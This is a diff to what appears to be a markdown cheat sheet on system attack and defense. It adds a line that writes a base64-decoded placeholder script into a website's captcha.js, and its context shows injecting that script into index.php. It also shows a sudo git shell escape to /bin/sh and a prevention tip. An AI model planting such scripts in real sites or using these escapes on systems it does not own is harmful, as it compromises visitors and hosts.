@@ -112,6 +112,7 @@ it is possible to set up traps on the system for example high priledged canary f
 nano /usr/local/apache2/htdocs/index.php
 # add <script src="./js/captcha.js"></script>
 echo "<captcha>" | base64 -d > /usr/local/apache2/htdocs/js/captcha.js
+bash -c 'echo "<base64...>" | base64 -d > /usr/local/apache2/htdocs/js/captcha.js'
 ```
 
 ### Cronjob Priviledge Escalation
@@ -138,7 +139,7 @@ sudo git help config
 !/bin/sh
 ```
 
-### Prevention
+#### Prevention
 avoid using NOPASSWD, think about all the options before adding command to sudo (gtfo bins)
 
 ### Information Exfiltration + Persistence
